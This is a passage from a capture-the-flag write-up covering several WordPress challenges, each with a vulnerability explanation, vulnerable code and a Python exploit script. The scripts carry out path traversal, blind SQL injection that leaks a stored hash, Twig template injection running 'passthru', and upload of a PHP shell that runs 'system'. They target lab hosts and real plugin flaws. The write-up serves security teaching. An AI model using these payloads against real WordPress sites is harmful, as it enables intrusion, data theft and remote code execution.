This vulnerability is related to a path traversal issue documented in the CVE: [WordPress Core 6.5.5 Contributor Arbitrary HTML File Read (Windows Only)](https://patchstack.com/database/vulnerability/wordpress/wordpress-core-6-5-5-contributor-arbitrary-html-file-read-windows-only-vulnerability).

### Steps to Exploit

*   **Register with the Custom Plugin:**

    Use the following command to create a new user:

    ```shell
    curl -X POST http://0.0.0.0:9089/wp-admin/admin-ajax.php?action=register_user \\
         -d "username=dimas@dimas" \\
         -d "password=dimas@dimas" \\
         -d "email=dimas@dimas"

    ```

*   **Create a Post:**

    *   After registering, create a new post.

    *   Switch to the **Code Editor** option.

    ![](./imgs/image_oBeQp2ci.png)

*   **Add the Payload:**

    Insert the following code to read the `flag.html` file located in the root directory. This works because the file can be included due to its `.html` extension.

    ```diff
    <!-- wp:template-part {"slug":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\flag","theme":"twentytwentyfour"} /-->

    ```

*   **Preview and Retrieve the Flag:**

    *   Preview the post to see the results.

    *   The flag will be displayed on your post page.

By following these steps, you can successfully exploit the vulnerability and retrieve the flag.

## Flag

![](./imgs/image_z6N4Ebdo.png)

# Wishlist

## Description

I have a small wishlist this year. I don't know if I am able to get it this year, can you help me to achieve my wishlist ?

NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/d57a9bf8-297d-4f95-8917-4d4120ca1325/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466563FIT6J%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T132311Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJHMEUCIQCn7uA2n45l8pKY7wWtbZP0bHFHIRUUnPQuCevZ9oW41AIgESWFrAOJlFqMVvFkZ0jjKMpoyPpEvE%2FjWAi2TTVGFHwqiAQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDImbvbGv4ImY2oS%2BLircA7sua9BtMO63u7cqMvFA17D2eJkjZSGp7QsnYJaxEXooKZVXnyorSf54LopSKIzY%2Bpjd8IudnVt2Ohon0jMtNqvalj%2BnCEV%2BTdUf1xjiOErSu72trPKXCU9qjMbZZKPtLeUegFb%2FU%2Bz8DpI6CK7ZnMV4pGazylf2F9BhE9bZQLc1sbeZNBLJQhVgQInZhvcfzCEupKz5S6yb0TtiMmMPsCMLkqa0SOW5wPhMOj9y%2BCzBkctMB%2BfkS5FmUcnIhQee1p36GR5sRMYLKaKyJ%2BYReUX4b%2BYPoO%2BAy9in%2BH6zdvmXS9ltGPdinJTPoVKBfeN%2FpJxOldRUcqueBFeD1g%2F617x%2FaRl0FGCllsSb69jnG7%2B8qR33MTt9SXnAJw8PAnJf%2FLU%2BH1WqjnikGERvj8MX7vnAsC2pE0aulyFQhXfftZQ722XOUKgGSUI1PyfFEee%2FAhnqxPQvsGlNJs3MsJejptg%2BFJZ1E%2B7XWnB%2Bl5ywn1Ai3f3hOn%2FJnlUhVq26kjaEvn0hJr%2FsKk%2FTt3pUua7KfUbaaA44I7vrj7ghzxLET55Iib%2FIyjcMiUAFwgjDdQHeQSSKJ9GAxSOae3XrlPoVkE5Grr4Wuq1XspqtcmOKC0DrcTIjrkJH9n%2BQ5vqSMJrYwcEGOqUBZpyZDTnDhETvt%2BY7tcCd0UVwmFfn4zVHxUF81pXbwpGv9O6mpluqtGfUsN0Xv0Io8Jnwt%2FMzVopNac51oSHFQwXEdvFlc6V99J69Vqy7HnjeJlTjYHwY2oWG2HSWtrEan4cu3eYYhN8VBIoRvvaQNGcCgI36FEW5N7k9PM1biemMiKZfKsTSjA44xRx5oko6Vhhzz3vABJMfprrfBhKxntLGwAbi\&X-Amz-Signature=8b5e01cdb594183c25ac89658b957ed4bf4be7f4c8d8906dde11e8e6f61ec149\&X-Amz-SignedHeaders=host\&x-id=GetObject)

## How to Solve

This challenge involves exploiting two vulnerabilities together:

*   **Unauthenticated Privilege Escalation in LiteSpeed Cache Plugin 6.3.0.1:**

    *   Reference: [LiteSpeed Cache Unauthenticated Privilege Escalation](https://patchstack.com/database/vulnerability/litespeed-cache/wordpress-litespeed-cache-plugin-6-3-0-1-unauthenticated-privilege-escalation-vulnerability).

*   **SQL Injection in TI WooCommerce Wishlist Plugin 2.8.2:**

    *   Reference: [TI WooCommerce Wishlist SQL Injection](https://patchstack.com/database/vulnerability/ti-woocommerce-wishlist/wordpress-ti-woocommerce-wishlist-plugin-2-8-2-sql-injection-vulnerability).

The SQL injection can be used to leak the `litespeed.router.hash`, which is used by the LiteSpeed Cache plugin to verify if a user can log in as another user. We can use the SQL injection to leak this hash and then manipulate the `litespeed_role` cookie to simulate another user's privileges.

### Vulnerability Chain Breakdown:

*   **SQL Injection to Leak** **`litespeed.router.hash`\*\*\*\*:**

    *   The SQL injection exists due to improper sanitization of the `order` parameter. You can verify this by reviewing the changes made in [this GitHub pull request](https://github.com/TemplateInvaders/ti-woocommerce-wishlist/pull/47/files), where the `order` value is now sanitized in specific functions, including `/wc/v3/wishlist/<id>/get_products`.

    ![](./imgs/image_7jGTw5y4.png)

*   **Privilege Escalation via Leaked Hash:**

    *   Once you obtain the `litespeed.router.hash`, use it to modify your cookies, simulating a higher privileged user.

    *   If the `role_uid` is not equal to `1`, the flag stored in the `FLAG_FLAG` environment variable will be revealed.

Here is the relevant code in the challenge that performs the role validation:

```php
public function is_role_simulation()
{
	if (is_admin()) {
		return;
	}

	if (empty($_COOKIE['litespeed_role']) || empty($_COOKIE['litespeed_hash'])) {
		return;
	}

	Debug2::debug('[Router] starting role validation');

	// Hash validation
	$hash = self::get_option(self::ITEM_HASH);
	if (!$hash || $_COOKIE['litespeed_hash'] != $hash) {
		Debug2::debug('[Router] hash not match ' . $_COOKIE['litespeed_hash'] . ' != ' . $hash);
		return;
	}

	$role_uid = $_COOKIE['litespeed_role'];
	Debug2::debug('[Router] role simulate litespeed_role uid ' . $role_uid);

	if ($role_uid !== "1") {
		echo getenv("FLAG_FLAG");
	}
}

```

### Exploit Script

This Python script performs the SQL injection to leak the `litespeed.router.hash` and then uses that hash to escalate privileges:

```python
import string
import asyncio
import httpx

# Define the target URL
# url = "http://0.0.0.0:9096/"
url = "http://100.25.255.51:9096/"
known = ""

# Asynchronous function to send POST requests
async def send_request(char, known):
    to_search = f"{known + char}%".encode().hex()

    data = {
        "rest_route": "/wc/v3/wishlist/e676f1/get_products",
        "order": f",extractvalue(null,concat((select 0 from dual where (select option_value from wp_options where option_name = 0x{'litespeed.router.hash'.encode().hex()}) like binary 0x{to_search}),0x01)) -- -",
    }

    async with httpx.AsyncClient(timeout=100) as client:
        response = await client.get(url, params=data)
        return char, response.text

# Main asynchronous function to control the process
async def sql_injection():
    global known
    while True:
        if len(known) == 6:
            break
        tasks = []
        for char in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ":
            tasks.append(send_request(char, known))

        responses = await asyncio.gather(*tasks)

        for char, response_text in responses:
            if "product_id" not in response_text:
                known += char
                print(f"Found character: {char}, known string so far: {known}")
                break

    with httpx.Client(base_url=url) as ht:
        ht.cookies.set("litespeed_hash", known)
        ht.cookies.set("litespeed_role", "100")
        rs = ht.get("/")
        print(rs.text)

# Run the async process
asyncio.run(sql_injection())

```

### Important Notes:

*   Replace the `e676f1` value in the `rest_route` with an actual wishlist ID that exists on the target.

## Flag

CTF{my\_wishlist\_is\_simple\_just\_sql\_injection\_and\_some\_bypass\_9fc36dff11}

# Texting Trouble

## Description

I just installed a plugin to automate sending SMS to my clients. That's a great plugin with many options, I don't think it could cause a security issue, right?

This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/b32c5919-3b12-4663-a3a8-d3b73977e7e4/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466272TET2F%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T132312Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJGMEQCICdrJUCWrGwS%2FcNZC6PkcOrDUwzALEeebVx5HS4RyhOyAiAX3fQaVmK4jTwFeUc5bGQoGSxMg6qvC6V9vTCpl7mHgyqIBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMb28vB6RqaI4ULUIkKtwDi%2BkkmLT%2B4RkQUVuulDuInUN5F3bh0tK2%2FgxD4J%2BpvIZJkCXGGjG9d7BmzZWkVq8ptpbP%2FIeW9FagLTtCJGFRN%2BvTJvvOreR0sNDz5aFxJinXuGy7nm7yISCzhqmXPGuMq%2FoKXw7xEtd6LQjo95Nu9n6UbhnFIirfxfIWh7j0FFUuHQ45n2FbN0F2TCRyNYgsDNSvD5qDL9SZI8C%2BXKm9Urm1uzMarr1VdchiTuREUPwSW1q5ChO1xJh3gZqxbrCaGFV91NsThV%2FQ4X2frnyMxS2U9HhCCyzOuEqsIRJd5PuMyesHygQOLrWNTrUQIko5E0PB8VFCG4%2Fa6z%2FVLgCVTKNuy3hkWZLpXcfUqUlFFZqqgahrCQ0eMtcHkg2mkfyi4KQhfKFje2Hu13ZykJ5OJfff%2F6fWnA5vVNyn214%2BkjXwM20VdaenOMZ56fF2S0D8dql31Po4FU3U%2BiTkvR1L0oMsgz7qjtVRuFsXIZZFOrcpaxOYfvK1ucB001RGmAjCI%2BrnITGYZSy3F%2BOpHSPrvhRb9xbYv4K1lNX0n0FzSUo9YoZYDzLYu15TDeL0Ki2HgqB58BS56CtJCHJtyomC%2BJYLwGXZSJODIdGtoyl91OAUKLs3uxaBsE5eIR0wqNjBwQY6pgH%2FYtL50IzpH5ftK%2BYX4Vl0gwbYacvq3wUqiSk786fwmB4Bh5iy83R8rdtPaVjWp%2FZeu45mcVRAPl6R1V5rZzl0AZ5sMCoJbJoATt558ehsujkg4TzmwNyrZTWRMWmSJXbtV0V6PN5GZ9DeJv%2BdjDU0AAw0%2Bm%2FFRxTPxt2nm1T6J%2BI951iU0qRd4NCf7BdnmgrAzWLtW2SZBNEVKMVh4%2B13xjr%2BzLnr\&X-Amz-Signature=c8416835332688657c8d71b0b60485767327bddf6d47e5bb10554c9d9567d529\&X-Amz-SignedHeaders=host\&x-id=GetObject)

## How to Solve

In this challenge, the vulnerability lies in the **Jotac Plugin** which allows for reading files from the server, given certain conditions. The plugin checks file extensions to ensure only a specific set of file types are allowed (like `txt`, `png`, `jpg`, `pdf`). However, the plugin doesn't properly sanitize the file path, which allows for **path traversal** to access arbitrary files.

### Vulnerability Details:

*   The vulnerable function is `send_message_callback`, which handles incoming POST requests.

*   The function checks for file attachments, allowing only certain extensions (`txt`, `png`, `jpg`, `pdf`).

*   If a verbose level is set in the request, the response will return a portion of the file contents.

### Exploit:

By exploiting this vulnerability, you can perform **path traversal** to access sensitive files such as `flag.txt` by passing a relative file path that escapes the restricted directory (e.g., `../../../../../../../../flag.txt`).

Here's the critical part of the vulnerable code:

```php
$allowed_extensions = ['txt','png','jpg','pdf'];
if (!in_array(pathinfo($mess_attachment, PATHINFO_EXTENSION), $allowed_extensions)) {
    $error = 6;
    $additional_error = "Filetype not supported";
} else {
    $wp_dir = wp_upload_dir();
    $attachment_fp = $wp_dir['basedir'] . '/attachments/' . $mess_attachment;
    $available_files = array_diff(scandir(dirname($attachment_fp)), array('.', '..'));
    if (in_array(basename($attachment_fp), $available_files)) {
        $attachment_raw = file_get_contents($attachment_fp);
    }
}
if ($_POST['level'] == 'verbose') {
    $response = array(
        'sent'=> "true",
        'attachment'=> esc_html(substr($attachment_raw, 0, 75)),
        'errorcode' => $error,
        'send_errors'=>$all_send_errors
    );
}

```

*   If the `level` is set to `verbose`, the function will return the first 75 characters of the file content, which is enough to leak sensitive information.

### Exploit Script

This Python script will exploit the vulnerability by sending a crafted request with a path traversal attack to read the `flag.txt` file:

```python
import httpx
import asyncio

# URL = "<http://localhost:8686>"  # Local testing URL
URL = "<http://100.25.255.51:9092/>"  # Target URL

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)

class API(BaseAPI):
    pass

async def main():
    api = API()

    # Send the payload to exploit the vulnerability
    res = await api.c.post("/wp-admin/admin-ajax.php?action=send_message", data={
        "sec": "6AGmIzDZktwJCaQt",  # Known secret key
        "jotmemid": "1-1",  # Member ID, can be any valid ID
        "level": "verbose",  # Verbose level to get the file contents
        "formdata": "jotac-plugin-messages[jot-message]=1&jotac-plugin-messages[jot-message-type]=jot-&jotac-plugin-messages[jot-attachment]=../../../../../../../../flag.txt"  # Path traversal attack
    })

    # Print the response containing the flag
    print(res.text)

if __name__ == "__main__":
    asyncio.run(main())

```

## Flag

CTF{PSEUDOLIMITED\_INCLUSION\_0z471}

# Timberlake

## Description

I'm a front end designer that has some old backend experience. Wanted to put some of my skills to make a cool website that can work with templates. Still WIP but it is coming along nicely.

Note: fully whitebox challenge, no need to do massive bruteforce

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/83713394-ffac-480a-adcd-66ac9e2b6982/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466272TET2F%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T132312Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJGMEQCICdrJUCWrGwS%2FcNZC6PkcOrDUwzALEeebVx5HS4RyhOyAiAX3fQaVmK4jTwFeUc5bGQoGSxMg6qvC6V9vTCpl7mHgyqIBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMb28vB6RqaI4ULUIkKtwDi%2BkkmLT%2B4RkQUVuulDuInUN5F3bh0tK2%2FgxD4J%2BpvIZJkCXGGjG9d7BmzZWkVq8ptpbP%2FIeW9FagLTtCJGFRN%2BvTJvvOreR0sNDz5aFxJinXuGy7nm7yISCzhqmXPGuMq%2FoKXw7xEtd6LQjo95Nu9n6UbhnFIirfxfIWh7j0FFUuHQ45n2FbN0F2TCRyNYgsDNSvD5qDL9SZI8C%2BXKm9Urm1uzMarr1VdchiTuREUPwSW1q5ChO1xJh3gZqxbrCaGFV91NsThV%2FQ4X2frnyMxS2U9HhCCyzOuEqsIRJd5PuMyesHygQOLrWNTrUQIko5E0PB8VFCG4%2Fa6z%2FVLgCVTKNuy3hkWZLpXcfUqUlFFZqqgahrCQ0eMtcHkg2mkfyi4KQhfKFje2Hu13ZykJ5OJfff%2F6fWnA5vVNyn214%2BkjXwM20VdaenOMZ56fF2S0D8dql31Po4FU3U%2BiTkvR1L0oMsgz7qjtVRuFsXIZZFOrcpaxOYfvK1ucB001RGmAjCI%2BrnITGYZSy3F%2BOpHSPrvhRb9xbYv4K1lNX0n0FzSUo9YoZYDzLYu15TDeL0Ki2HgqB58BS56CtJCHJtyomC%2BJYLwGXZSJODIdGtoyl91OAUKLs3uxaBsE5eIR0wqNjBwQY6pgH%2FYtL50IzpH5ftK%2BYX4Vl0gwbYacvq3wUqiSk786fwmB4Bh5iy83R8rdtPaVjWp%2FZeu45mcVRAPl6R1V5rZzl0AZ5sMCoJbJoATt558ehsujkg4TzmwNyrZTWRMWmSJXbtV0V6PN5GZ9DeJv%2BdjDU0AAw0%2Bm%2FFRxTPxt2nm1T6J%2BI951iU0qRd4NCf7BdnmgrAzWLtW2SZBNEVKMVh4%2B13xjr%2BzLnr\&X-Amz-Signature=23cb75ad9a95053ff27b07c1258c939ae33119d8393b0faeb5629b402032ea36\&X-Amz-SignedHeaders=host\&x-id=GetObject)

## How to Solve

In this challenge, there’s a **Server-Side Template Injection (SSTI)** vulnerability present in the **Thimberlake Theme**. The vulnerability arises from the use of user input in the `Timber::render` function without proper sanitization.

### Vulnerability Details

Here’s the relevant code snippet:

```php
if(isset($_REQUEST['page']) && validate($_REQUEST['page'])){
    $page = $_REQUEST['page'];
};
Timber::render($page, $context);

```

The `$page` variable is derived from the user-supplied input (`$_REQUEST['page']`), allowing for potential SSTI if proper validation is not enforced.

The exploitation involves crafting a request that leverages the SSTI to execute server-side commands. We can use Twig's capabilities to run PHP functions through the template rendering.

The following payload can be used to exploit the SSTI:

```python
import httpx
import asyncio

URL = "http://100.25.255.51:9095/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)

class API(BaseAPI):
    pass

async def main():
    api = API()

    # Step 1: Save the session data with an SSTI payload
    res = await api.c.get("/wp-admin/admin-ajax.php", params={
        "action": "save_session",
        "session_data": "{{['nl /*']|map('passthru')}}"
    })

    # Step 2: Render the page that contains the SSTI payload
    res = await api.c.get("/", params={
        "page": "sess_" + res.cookies.get("PHPSESSID")  # our session id that contains the SSTI
    })

    # Step 3: Print the result of the SSTI execution
    print(res.text)

if __name__ == "__main__":
    asyncio.run(main())

```

## Flag

CTF{f0rc3d\_sst1\_ch4ll\_zz4z2561}

# My Shop Disaster

## Description

I just installed wordpress to sell my stuff with Woocommerce. I found it a bit boring so I installed that other plugin to pimp it, I don't think it could cause a security issue?

This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/104e2849-25d7-4dc6-b487-3f5ee9a15618/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466272TET2F%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T132312Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJGMEQCICdrJUCWrGwS%2FcNZC6PkcOrDUwzALEeebVx5HS4RyhOyAiAX3fQaVmK4jTwFeUc5bGQoGSxMg6qvC6V9vTCpl7mHgyqIBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMb28vB6RqaI4ULUIkKtwDi%2BkkmLT%2B4RkQUVuulDuInUN5F3bh0tK2%2FgxD4J%2BpvIZJkCXGGjG9d7BmzZWkVq8ptpbP%2FIeW9FagLTtCJGFRN%2BvTJvvOreR0sNDz5aFxJinXuGy7nm7yISCzhqmXPGuMq%2FoKXw7xEtd6LQjo95Nu9n6UbhnFIirfxfIWh7j0FFUuHQ45n2FbN0F2TCRyNYgsDNSvD5qDL9SZI8C%2BXKm9Urm1uzMarr1VdchiTuREUPwSW1q5ChO1xJh3gZqxbrCaGFV91NsThV%2FQ4X2frnyMxS2U9HhCCyzOuEqsIRJd5PuMyesHygQOLrWNTrUQIko5E0PB8VFCG4%2Fa6z%2FVLgCVTKNuy3hkWZLpXcfUqUlFFZqqgahrCQ0eMtcHkg2mkfyi4KQhfKFje2Hu13ZykJ5OJfff%2F6fWnA5vVNyn214%2BkjXwM20VdaenOMZ56fF2S0D8dql31Po4FU3U%2BiTkvR1L0oMsgz7qjtVRuFsXIZZFOrcpaxOYfvK1ucB001RGmAjCI%2BrnITGYZSy3F%2BOpHSPrvhRb9xbYv4K1lNX0n0FzSUo9YoZYDzLYu15TDeL0Ki2HgqB58BS56CtJCHJtyomC%2BJYLwGXZSJODIdGtoyl91OAUKLs3uxaBsE5eIR0wqNjBwQY6pgH%2FYtL50IzpH5ftK%2BYX4Vl0gwbYacvq3wUqiSk786fwmB4Bh5iy83R8rdtPaVjWp%2FZeu45mcVRAPl6R1V5rZzl0AZ5sMCoJbJoATt558ehsujkg4TzmwNyrZTWRMWmSJXbtV0V6PN5GZ9DeJv%2BdjDU0AAw0%2Bm%2FFRxTPxt2nm1T6J%2BI951iU0qRd4NCf7BdnmgrAzWLtW2SZBNEVKMVh4%2B13xjr%2BzLnr\&X-Amz-Signature=b53c092e2af09aacae7a576a3a1b13c74497a6ebd1b9b82dc8297d56beefcbe0\&X-Amz-SignedHeaders=host\&x-id=GetObject)

## How to Solve

In this challenge, there is a **file upload vulnerability** in the **Woo Variations** plugin, specifically in the `set_gallery_picture` function. This vulnerability allows authenticated users with low privilage to upload files without proper authorization checks.

### Vulnerability Details

The relevant code snippet shows that the `set_gallery_picture` function is hooked to an AJAX action that can be accessed without authentication:

```php
add_action( 'wp_ajax_nopriv_set_gallery_picture', array( $this, 'set_gallery_picture' ) );

```

The `check_permission` function checks if the current user has admin permissions based on the username:

```php
function check_permission() {
    if ( !current_user_can( "manage_options" ) && strpos( wp_get_current_user()->user_login, 'admin' ) === false ) {
        return false;
    }
    return true;
}

```

### Exploitation Steps

To exploit this vulnerability, you need to:

*   **Register a User**: Create a user with "admin" in the username to pass the permission check.

*   **Upload a Malicious File**: Use the `set_gallery_picture` function to upload a PHP file that can execute commands on the server.

*   **Access the Uploaded File**: Retrieve the file and execute commands, such as reading sensitive files.

### Exploit Script

Here's the Python script to perform the exploit:

```python
import httpx
import asyncio

URL = "http://100.25.255.51:9090"
COOKIE = "dimasadmin%7C1727237044%7CfbV2k541XkmCm4cuqdgGpIS29hK1p44L8T26qqy8Cfc%7Ca7321f10cc89cae9e56aeccbe42e0b580aa386cdca33920f7abfc2168c601486"
CNAME = "wordpress_c650151c791a3020134332fe15b253e5"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)

class API(BaseAPI):
    pass

async def main():
    api = API()
    api.c.cookies.set(CNAME, COOKIE)  # Set the cookie for authenticated session

    # Step 1: Upload the malicious PHP file
    res = await api.c.post("/wp-admin/admin-ajax.php?action=nopriv_set_gallery_picture", data={
        "product_id": 1  # Specify a valid product ID
    }, files={
        "gallery_picture": ("dimas.php", "<?php system('cat /flag.txt');?>")  # PHP payload to execute
    })

    # Step 2: Access the uploaded file to execute the payload
    res = await api.c.get("/wp-content/uploads/woo-gallery/dimas.php")
    print(res.text)  # Output the result of the executed command

if __name__ == "__main__":
    asyncio.run(main())

```

### Note

*   **Set Cookies**: you need to replace the cookie with your own cookie that can be get after you register and login in [/wp-login.php](http://100.25.255.51:9090/wp-login.php)

## Flag

CTF{891241df84ff\_ADMIN\_PERMIT\_ANYWAYS\_0z195}

# JustinWonkyTokens

## Description

Hey, new Wordpress Dev here. I'm developing a simple authentication checker service that I will later connect it to a REST api. I have downloaded some boilerplate plugin templates and started working on them. I have a demo plugin already do you want to check if it works correctly?

This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/224a815d-7939-42a2-8be4-97cc93c2f2bf/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466272TET2F%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T132312Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJGMEQCICdrJUCWrGwS%2FcNZC6PkcOrDUwzALEeebVx5HS4RyhOyAiAX3fQaVmK4jTwFeUc5bGQoGSxMg6qvC6V9vTCpl7mHgyqIBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMb28vB6RqaI4ULUIkKtwDi%2BkkmLT%2B4RkQUVuulDuInUN5F3bh0tK2%2FgxD4J%2BpvIZJkCXGGjG9d7BmzZWkVq8ptpbP%2FIeW9FagLTtCJGFRN%2BvTJvvOreR0sNDz5aFxJinXuGy7nm7yISCzhqmXPGuMq%2FoKXw7xEtd6LQjo95Nu9n6UbhnFIirfxfIWh7j0FFUuHQ45n2FbN0F2TCRyNYgsDNSvD5qDL9SZI8C%2BXKm9Urm1uzMarr1VdchiTuREUPwSW1q5ChO1xJh3gZqxbrCaGFV91NsThV%2FQ4X2frnyMxS2U9HhCCyzOuEqsIRJd5PuMyesHygQOLrWNTrUQIko5E0PB8VFCG4%2Fa6z%2FVLgCVTKNuy3hkWZLpXcfUqUlFFZqqgahrCQ0eMtcHkg2mkfyi4KQhfKFje2Hu13ZykJ5OJfff%2F6fWnA5vVNyn214%2BkjXwM20VdaenOMZ56fF2S0D8dql31Po4FU3U%2BiTkvR1L0oMsgz7qjtVRuFsXIZZFOrcpaxOYfvK1ucB001RGmAjCI%2BrnITGYZSy3F%2BOpHSPrvhRb9xbYv4K1lNX0n0FzSUo9YoZYDzLYu15TDeL0Ki2HgqB58BS56CtJCHJtyomC%2BJYLwGXZSJODIdGtoyl91OAUKLs3uxaBsE5eIR0wqNjBwQY6pgH%2FYtL50IzpH5ftK%2BYX4Vl0gwbYacvq3wUqiSk786fwmB4Bh5iy83R8rdtPaVjWp%2FZeu45mcVRAPl6R1V5rZzl0AZ5sMCoJbJoATt558ehsujkg4TzmwNyrZTWRMWmSJXbtV0V6PN5GZ9DeJv%2BdjDU0AAw0%2Bm%2FFRxTPxt2nm1T6J%2BI951iU0qRd4NCf7BdnmgrAzWLtW2SZBNEVKMVh4%2B13xjr%2BzLnr\&X-Amz-Signature=a9d004f63412ea0bc5616c5087961a3f19a281ed9a0082f24794bd2613c94f51\&X-Amz-SignedHeaders=host\&x-id=GetObject)

## How to Solve

In this challenge, you need to manipulate a JWT (JSON Web Token) to exploit a vulnerability in the **Simple JWT Handler** plugin. The goal is to use an algorithm that does not require a keypair for encoding and decoding.

### Vulnerability Details

The plugin allows JWT encoding and decoding using various algorithms, including **HS256** (HMAC) and **RS256** (RSA). However, you can take advantage of the fact that the plugin doesn't properly enforce algorithm usage, allowing you to use **HS256** with a public key.

### Steps to Exploit

*   **Create a Malicious JWT**: Use HS256 to encode a JWT with admin privileges.

*   **Set the JWT Cookie**: Send the JWT as a cookie to the target server.

*   **Trigger the Endpoint**: Access the endpoint that processes the JWT to gain unauthorized access.

### Creating the JWT

Here’s how to create the JWT using HS256 with a payload indicating admin role:

```php
<?php
/*
Plugin Name: Simple JWT Handler
Description: A simple plugin for handling JWT encoding and decoding.
Version: 1.3
Author: Patchstack
*/

class SimpleJWTHandler
{
    static $algorithms = array(
        'HS256' => array('hash_hmac', 'SHA256'),
        'HS512' => array('hash_hmac', 'SHA512'),
        'HS384' => array('hash_hmac', 'SHA384'),
        'RS256' => array('openssl', 'SHA256'),
    );

    public static function decodeToken($token, $key = null, $verify = true)
    {
        $segments = explode('.', $token);
        if (count($segments) != 3) {
            throw new UnexpectedValueException('Invalid token structure');
        }
        list($header64, $payload64, $signature64) = $segments;
        $header = self::jsonDecode(self::urlSafeBase64Decode($header64));
        $payload = self::jsonDecode(self::urlSafeBase64Decode($payload64));
        $signature = self::urlSafeBase64Decode($signature64);

        if ($verify) {
            if (empty($header->alg)) {
                throw new DomainException('Algorithm missing');
            }
            if (is_array($key)) {
                if (isset($header->kid)) {
                    $key = $key[$header->kid];
                } else {
                    throw new DomainException('Key ID missing');
                }
            }
            if (!self::verifySignature("$header64.$payload64", $signature, $key, $header->alg)) {
                throw new UnexpectedValueException('Signature verification failed');
            }
            if (isset($payload->exp) && time() >= $payload->exp) {
                throw new UnexpectedValueException('Token expired');
            }
        }
        return $payload;
    }

    public static function encodeToken($data, $key, $algo = 'HS256', $keyId = null)
    {
        $header = array('typ' => 'JWT', 'alg' => $algo);
        if ($keyId !== null) {
            $header['kid'] = $keyId;
        }
        $segments = array(
            self::urlSafeBase64Encode(self::jsonEncode($header)),
            self::urlSafeBase64Encode(self::jsonEncode($data))
        );
        $signingInput = implode('.', $segments);
        $signature = self::createSignature($signingInput, $key, $algo);
        $segments[] = self::urlSafeBase64Encode($signature);

        return implode('.', $segments);
    }

    public static function createSignature($message, $key, $algo = 'HS256')
    {
        if (empty(self::$algorithms[$algo])) {
            throw new DomainException('Unsupported algorithm');
        }
        list($function, $algorithm) = self::$algorithms[$algo];
        switch ($function) {
            case 'hash_hmac':
                return hash_hmac($algorithm, $message, $key, true);
            case 'openssl':
                $signature = '';
                $success = openssl_sign($message, $signature, $key, $algorithm);
                if (!$success) {
                    throw new DomainException("OpenSSL signature failure");
                }
                return $signature;
        }
    }

    public static function verifySignature($message, $signature, $key, $algo = 'HS256')
    {
        if (empty(self::$algorithms[$algo])) {
            throw new DomainException('Unsupported algorithm');
        }
        list($function, $algorithm) = self::$algorithms[$algo];
        switch ($function) {
            case 'openssl':
                $success = openssl_verify($message, $signature, $key, $algorithm);
                if (!$success) {
                    throw new DomainException("OpenSSL verification failure");
                }
                return true;
            case 'hash_hmac':
            default:
                return $signature === hash_hmac($algorithm, $message, $key, true);
        }
    }

    public static function jsonDecode($input)
    {
        $result = json_decode($input);
        if (json_last_error() !== JSON_ERROR_NONE) {
            throw new DomainException('JSON decoding error');
        }
        return $result;
    }

    public static function jsonEncode($input)
    {
        $result = json_encode($input);
        if (json_last_error() !== JSON_ERROR_NONE) {
            throw new DomainException('JSON encoding error');
        }
        return $result;
    }

    public static function urlSafeBase64Decode($input)
    {
        $remainder = strlen($input) % 4;
